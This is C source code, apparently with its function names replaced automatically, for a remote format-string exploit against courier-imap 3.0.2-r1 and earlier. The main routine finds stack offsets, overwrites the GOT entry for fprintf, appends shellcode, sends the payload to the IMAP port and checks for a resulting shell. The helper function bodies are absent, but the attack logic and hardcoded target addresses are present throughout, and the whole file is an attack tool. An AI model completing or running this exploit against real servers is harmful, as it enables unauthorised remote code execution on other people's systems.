#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int DUMMY_NUMBER ; 
 unsigned long GAP_EBP_ESP ; 
 int IMAP_PORT ; 
 int TOP_STACK ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int,char*) ; 
 char* FUNC3 (int) ; 
 int FUNC4 (char*,int) ; 
 char* FUNC5 (int*,int,int,int) ; 
 int* FUNC6 (unsigned long,unsigned long,unsigned long) ; 
 char* FUNC7 (char*,char*) ; 
 int FUNC8 (int,int,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (int,char*) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int FUNC13 (int,unsigned long,int,char*,int) ; 

FUNC14 (int argc, char **argv) {
 char *host="127.0.0.1";
 int port = IMAP_PORT;
 int sock;
 
 char *temp1, *temp2;
 char *request;
 int *vec;
 
 int n,ok,i;
 
 unsigned long cur_ebp; // was 5100 on my box
 int ce_number = 0;
 unsigned long saved_ebp; // was 3287 on my box
 int se_number = 0;
 unsigned long write_addy;
 int write_number = 0;
 unsigned long got_addy;
 int got_number = 0;
 
 /* objdump -R /usr/lib/courier-imap/sbin/imaplogin | grep fprintf */
 unsigned long got = 0x0804fefc;
 /* heh.. it's up to you to find this one :P Just use your favourite mathod */
 unsigned long ret = 0x8057000;
  
 if (argc > 1)
  host = argv[1];

 FUNC9("courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit by ktha at hush dot com\n");
 
 FUNC9("[*] Launching attack against %s:%d\n",host,port);
 
 if (ce_number == 0)
  ce_number = FUNC4(host,port);
 cur_ebp = TOP_STACK - 4 * ce_number;
 
 got_number = DUMMY_NUMBER;
 got_addy = cur_ebp + 4 * (got_number - 1);
  
 FUNC9("[+] Got current ebp(%d): %p\n",ce_number,cur_ebp);
 
 do{
  se_number = FUNC8(se_number,ce_number,host,port);
  if (se_number == -1)
  FUNC2(1,"[-] Failed to get a saved_ebp !");
  
  saved_ebp = cur_ebp + 4 * (se_number - 1);
  FUNC9("[+] Got possible saved ebp(%d): %p\n",se_number,saved_ebp);
  
  write_addy = GAP_EBP_ESP + saved_ebp;
  write_number = (write_addy - cur_ebp) / 4 + 1;
 FUNC9("[+] Got possible write on the stack pointer(%d): %p\n",write_number,write_addy);
  
  FUNC9("[+] Verifying...");
  ok = FUNC13(write_number,got_addy,se_number,host,port);
  if (ok)
  FUNC9("OK\n");
  else {
  FUNC9("failed\n");
  se_number++;
  }
 }while (!ok);
 
 FUNC9("[+] Building fmt...");
 vec = FUNC6(got_addy,got,ret);
 temp1 = FUNC5(vec,se_number,write_number,got_number);
 FUNC9("done\n");
 
 FUNC9("[+] Building shellcode...");
 temp2 = FUNC3(800);
 FUNC9("done\n");
 
 FUNC9("[*] Using ret: %p\n",ret);
 FUNC9("[*] Using got of fprintf(): %p\n",got);
 
 request = FUNC7(temp1,temp2);
 
 sock = FUNC1(host, port);
 FUNC11(sock,request);
 FUNC12(2);
 FUNC0 (sock);
 
 FUNC9("[*] Checking for shell..\n");
 FUNC10(host);
}